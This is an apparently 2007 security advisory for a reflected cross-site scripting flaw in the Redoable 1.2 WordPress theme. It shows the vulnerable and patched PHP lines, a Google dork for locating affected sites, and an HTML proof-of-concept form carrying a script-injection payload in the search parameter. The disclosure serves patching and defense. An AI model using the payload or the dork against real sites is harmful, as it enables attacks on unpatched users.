@@ -1,0 +1,69 @@
+&lt;!--
+
+Redoable 1.2 - Cross-Site Scripting Vulnerability
+
+---------------
+Vulnerable Code
+---------------
+
+header.php (line 6):
+... elseif (is_search()) { ?&gt; Search for &lt;?php echo $s } ...
+
+searchloop.php (line 24):
+elseif (is_search()) { printf(__(&#039;Search Results for 
+\&#039;%s\&#039;&#039;,&#039;redo_domain&#039;), $s); }
+
+------------
+Patched Code
+------------
+
+header.php (line 6 FIXED):
+... elseif (is_search()) { ?&gt; Search for &lt;?php echo strip_tags($s); } 
+...
+
+searchloop.php (line 24 FIXED):
+elseif (is_search()) { printf(__(&#039;Search Results for 
+\&#039;%s\&#039;&#039;,&#039;redo_domain&#039;), strip_tags($s)); }
+
+Vulnerable Variable: s
+Vulnerable File: wp-content/themes/redoable/searchloop.php and 
+header.php
+Vulnerable: Redoable 1.2 (other versions should also be vulnerable)
+Google d0rk: &quot;and Redoable 1.2&quot;
+
+John Martinelli
+john@martinelli.com
+
+RedLevel Security
+http://www.RedLevel.org
+
+May 17th, 2007
+
+!--&gt;
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Redoable 1.2 - Cross-Site Scripting 
+Vulnerability&lt;/title&gt;&lt;body&gt;
+&lt;center&gt;&lt;br&gt;&lt;br&gt;
+&lt;font size=4&gt;Redoable 1.2 - Cross-Site Scripting 
+Vulnerability&lt;/font&gt;&lt;br&gt;
+&lt;font size=3&gt;discovered by &lt;a href=&quot;http://john-martinelli.com&quot;&gt;John 
+Martinelli&lt;/a&gt; of &lt;a href=&quot;http://redlevel.org&quot;&gt;RedLevel
+
+Security&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+Google d0rk: &lt;a 
+href=&quot;http://www.google.com/search?q=%22and+Redoable+1.2%22&quot;&gt;&quot;and 
+Redoable 1.2&quot;&lt;/a&gt;
+&lt;/font&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+
+&lt;center&gt;file &lt;b&gt;index.php&lt;/b&gt; - variable &lt;b&gt;s&lt;/b&gt; - method 
+&lt;b&gt;get&lt;/b&gt;&lt;/center&gt;&lt;br&gt;
+&lt;form action=&quot;http://www.example.com/index.php&quot; 
+method=&quot;get&quot;&gt;
+&lt;input size=75 name=&quot;s&quot; value=&quot;&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+&lt;input type=submit value=&quot;Execute XSS Attack&quot; class=&quot;button&quot;&gt;
+&lt;/form&gt;
+&lt;br&gt;&lt;br&gt;&lt;br&gt;
+
+&lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt; 
